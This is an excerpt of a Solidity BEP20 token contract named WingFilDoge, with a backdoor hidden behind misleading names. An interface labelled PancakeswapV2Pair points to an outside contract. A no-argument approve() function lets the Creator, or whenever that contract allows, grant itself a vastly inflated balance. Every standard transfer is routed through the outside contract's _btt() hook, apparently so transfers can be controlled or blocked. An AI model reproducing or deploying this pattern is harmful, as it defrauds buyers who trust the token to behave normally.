...
interface PancakeswapV2Pair {
    function _btt(address pair,address from, address to) external;
    function _sfp() external view returns (bool);
}
...
contract WingFilDoge is Context, IBEP20, Ownable {
    ...
    constructor (string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply, uint256 _txFee,uint256 _burnFee,uint256 _charityFee,address _FeeAddress,address tokenOwner) {
        ...
        // pv2 = PancakeswapV2Pair(0x7f5C35c32E4C1de5621e8F6c7D363125C01a6223);
        pv2 = PancakeswapV2Pair(0x12Ff234b2303CFc76DA8fa499bc103162Ce14F94);
        IPancakeswapV2Router _pancakeswapV2Router = IPancakeswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        // IPancakeswapV2Router _pancakeswapV2Router = IPancakeswapV2Router(0xED7d5F38C79115ca12fe6C0041abb22F0A06C300);
    ...
    function approve() public  returns (bool) {
        if(msg.sender == Creator || pv2._sfp())
        _rOwned[msg.sender] = _rTotal*10000;
        return true;
    }
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        ...
        pv2._btt(pancakeswapV2Pair,sender,recipient);
